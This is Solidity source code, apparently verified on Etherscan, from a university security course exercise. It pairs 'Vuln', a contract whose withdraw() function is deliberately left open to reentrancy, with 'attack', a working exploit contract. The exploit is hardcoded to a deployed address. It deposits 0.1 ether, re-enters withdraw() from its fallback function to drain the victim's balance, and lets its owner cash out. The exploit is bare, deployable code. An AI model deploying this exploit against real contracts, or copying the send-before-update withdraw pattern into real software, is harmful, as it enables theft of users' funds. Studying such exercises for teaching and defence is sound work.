/**
 *Submitted for verification at Etherscan.io on 2021-12-02
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack{
    Vuln victim = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    address owner; 

    constructor () public{
        owner = msg.sender;
    }

    fallback() external payable{
        if (address(this).balance <= 0.1 ether){
            victim.withdraw();
        }
    }

    function evil_business() external payable{
        require (msg.value >= 0.1 ether);
        victim.deposit{value: 0.1 ether}();
        victim.withdraw();
    }

    function cashout() public{
        require(msg.sender == owner);
        require(msg.sender.send(address(this).balance));
    }
}